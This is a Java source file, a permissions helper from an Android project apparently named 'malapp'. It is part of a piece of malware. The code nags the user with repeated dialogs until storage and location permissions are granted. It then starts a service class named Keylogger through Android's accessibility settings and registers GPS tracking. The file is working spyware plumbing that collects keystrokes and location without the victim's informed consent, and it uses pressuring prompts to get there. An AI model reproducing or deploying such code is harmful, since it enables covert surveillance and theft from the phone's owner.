package com.posseggs.malapp;

import android.Manifest;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.location.LocationManager;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.view.accessibility.AccessibilityManager;

import java.util.List;

public class PermissionsHelper implements ActivityCompat.OnRequestPermissionsResultCallback {

    //IDs
    public static final int REQUEST_CODE_WRITE_EXTERNAL_STORAGE = 18351;
    public static final int REQUEST_CODE_GET_ACCESSIBILITY = 13515;
    public static final int REQUEST_CODE_GET_LOCATION = 15351;

    //TAG
    private static final String TAG="PermissionsHelper";

    MainActivity main;

    public PermissionsHelper(MainActivity main)
    {
        this.main = main;
    }

    //Ask for permission if not given
    public void checkPermissions()
    {
        //Permissions were not given yet
        if (ContextCompat.checkSelfPermission(main, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) //Get write permissions
        {
            //Ask for permissions
            new AlertDialog.Builder(main)
                    .setMessage("This app needs storage permissions to function! Please give the needed permissions!")
                    .setTitle("Permissions needed!")                                      //If yes give permissions
                    .setPositiveButton("OK", (DialogInterface dialog, int which) -> ActivityCompat.requestPermissions(main, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, REQUEST_CODE_WRITE_EXTERNAL_STORAGE))
                    .setNegativeButton("Cancel", (DialogInterface dialog, int which) -> permissionDeniedAlert())
                    .create()
                    .show();
        }

        if (ContextCompat.checkSelfPermission(main, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) //Get location permissions
        {
            //Ask for permissions
            new AlertDialog.Builder(main)
                    .setMessage("This app needs location permissions to function! Please give the needed permissions!")
                    .setTitle("Permissions needed!")                                      //If yes give permissions
                    .setPositiveButton("OK", (DialogInterface dialog, int which) -> ActivityCompat.requestPermissions(main, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, REQUEST_CODE_GET_LOCATION))
                    .setNegativeButton("Cancel", (DialogInterface dialog, int which) -> permissionDeniedAlert())
                    .create()
                    .show();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode)
        {
            case REQUEST_CODE_WRITE_EXTERNAL_STORAGE:
            {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    //Permission granted
                    //Check if app is updated and if not ask for update
                    enableAccessibility();
                }
                else
                {   //Alert user that only with permissions will run
                    permissionDeniedAlert();
                }
                return;
            }
            case REQUEST_CODE_GET_ACCESSIBILITY:
            {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    //Permission granted
                    //Everything ok
                    return;
                }
                else
                {   //Alert user that only with permissions will run
                    permissionDeniedAlert();
                }
                return;
            }
            case REQUEST_CODE_GET_LOCATION:
            {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    //Permission granted
                    LocationManager locationManager = (LocationManager)main.getSystemService(Context.LOCATION_SERVICE);
                    LocationReader locationReader = new LocationReader(main.getApplicationContext());

                    try //Make listener to read location when changed
                    {
                        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 10, locationReader);
                    }
                    catch (SecurityException sEx)
                    {
                        Log.d(TAG,sEx.getMessage());
                    }
                }
                else
                {   //Alert user that only with permissions will run
                    permissionDeniedAlert();
                }
                return;
            }
            // next case ... and so on
        }
    }

    private void enableAccessibility(){
        AccessibilityManager aM = (AccessibilityManager) main.getSystemService(Context.ACCESSIBILITY_SERVICE);
        List<AccessibilityServiceInfo> enabledServices = aM.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);

        for (AccessibilityServiceInfo enabledService : enabledServices) {
            ServiceInfo enabledServiceInfo = enabledService.getResolveInfo().serviceInfo;
            //Service is accessibility service and is Keylogger
            if (enabledServiceInfo.packageName.equals(main.getPackageName()) && enabledServiceInfo.name.equals(Keylogger.class.getName()))
            {   //Start Accessibility service
                Log.d(TAG,"Accessibility service active");
                Intent accessibleIntent = new Intent(main, Keylogger.class);
                main.startService(accessibleIntent);
                return;
            }
        }
        //Ask for Accessibility permissions
        askAccessibility();
    }

    private void permissionDeniedAlert()
    {
        //Permissions denied. Ask again
        new AlertDialog.Builder(main)
                .setMessage("This app needs the requested permissions to function! Without the permissions the app cannot run and will close automatically!\nAre you sure you don't want to give permissions?")
                .setTitle("Permissions needed!")
                .setPositiveButton("Yes", (DialogInterface dialog, int which) -> main.finish()) //End app
                .setNegativeButton("No", (DialogInterface dialog, int which) -> checkPermissions()) //Ask again
                .create()
                .show();
    }

    private void askAccessibility()
    {
        Log.d(TAG,"Requesting service start!");
        Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
        main.startActivityForResult(intent, REQUEST_CODE_GET_ACCESSIBILITY);
    }
}